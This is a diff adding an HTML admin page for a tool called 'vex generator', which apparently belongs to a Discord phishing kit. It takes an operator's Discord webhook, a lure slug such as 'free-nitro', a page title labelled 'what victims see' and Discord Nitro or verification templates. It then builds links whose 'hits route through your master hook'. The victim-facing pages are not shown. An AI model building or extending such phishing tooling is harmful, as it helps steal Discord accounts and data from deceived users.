@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0f;
+            color: #e0e0e0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .panel {
+            background: #12121a;
+            border: 1px solid #1e1e2e;
+            border-radius: 16px;
+            padding: 40px;
+            width: 90%;
+            max-width: 520px;
+            box-shadow: 0 0 60px rgba(88, 66, 255, 0.08);
+        }
+        .panel h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #fff;
+        }
+        .panel .sub {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: #888;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px 16px;
+            background: #0d0d14;
+            border: 1px solid #1e1e2e;
+            border-radius: 10px;
+            color: #e0e0e0;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            margin-bottom: 20px;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        input:focus {
+            border-color: #5842ff;
+        }
+        input::placeholder { color: #3a3a4a; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #5842ff, #7c3aed);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.15s, box-shadow 0.2s;
+            font-family: 'Inter', sans-serif;
+        }
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 20px rgba(88, 66, 255, 0.35);
+        }
+        .btn:active { transform: translateY(0); }
+        .gen-link {
+            margin-top: 20px;
+            padding: 16px;
+            background: #0d0d14;
+            border: 1px dashed #2a2a3a;
+            border-radius: 10px;
+            display: none;
+        }
+        .gen-link p {
+            font-size: 11px;
+            color: #555;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+        .gen-link a {
+            color: #7c3aed;
+            word-break: break-all;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .gen-link a:hover { text-decoration: underline; }
+        .status {
+            margin-top: 12px;
+            font-size: 12px;
+            color: #4ade80;
+            display: none;
+        }
+        .divider {
+            border: none;
+            border-top: 1px solid #1a1a2a;
+            margin: 24px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="panel">
+        <h1>⚡ vex generator</h1>
+        <p class="sub">Generate triple-hooked referral links. All hits route through your master hook.</p>
+
+        <label>Your Master Webhook</label>
+        <input type="text" id="masterHook" placeholder="https://discord.com/api/webhooks/..." />
+
+        <label>Custom Directory Slug</label>
+        <input type="text" id="slug" placeholder="free-nitro, promo, verify..." />
+
+        <label>Referral Username</label>
+        <input type="text" id="refUser" placeholder="Username tag for tracking" />
+
+        <hr class="divider">
+
+        <label>Page Title (what victims see)</label>
+        <input type="text" id="pageTitle" placeholder="Discord Nitro Verification" />
+
+        <label>Page Template</label>
+        <select id="template">
+            <option value="nitro">Discord Nitro</option>
+            <option value="verify">Verification</option>
+            <option value="custom">Custom Blank</option>
+        </select>
+
+        <button class="btn" onclick="generateLink()">Generate Link</button>
+
+        <div class="gen-link" id="genLink">
+            <p>Your referral link</p>
+            <a id="outputLink" href="#" target="_blank"></a>
+        </div>
+        <div class="status" id="status">✓ Config saved to localStorage</div>
+    </div>
+
+    <script>
+        function generateLink() {
+            const master = document.getElementById('masterHook').value.trim();
+            const slug = document.getElementById('slug').value.trim().replace(/\s+/g, '-').toLowerCase();
+            const ref = document.getElementById('refUser').value.trim();
+            const title = document.getElementById('pageTitle').value.trim();
+            const template = document.getElementById('template').value;
+
+            if (!master || !slug || !ref) {
+                alert('Fill master webhook, slug, and referral user.');
+                return;
+            }
+
+            const config = { master, slug, ref, title, template };
+            localStorage.setItem('vex_config', JSON.stringify(config));
+
+            const base = window.location.origin;
+            const link = `${base}/${slug}?ref=${encodeURIComponent(ref)}`;
+
+            document.getElementById('outputLink').href = link;
+            document.getElementById('outputLink').textContent = link;
+            document.getElementById('genLink').style.display = 'block';
+            document.getElementById('status').style.display = 'block';
+        }
+
+        // load saved
+        window.addEventListener('load', () => {
+            const saved = JSON.parse(localStorage.getItem('vex_config') || '{}');
+            if (saved.master) document.getElementById('masterHook').value = saved.master;
+            if (saved.slug) document.getElementById('slug').value = saved.slug;
+            if (saved.ref) document.getElementById('refUser').value = saved.ref;
+            if (saved.pageTitle) document.getElementById('pageTitle').value = saved.pageTitle;
+        });
+    </script>
+</body>
+</html>
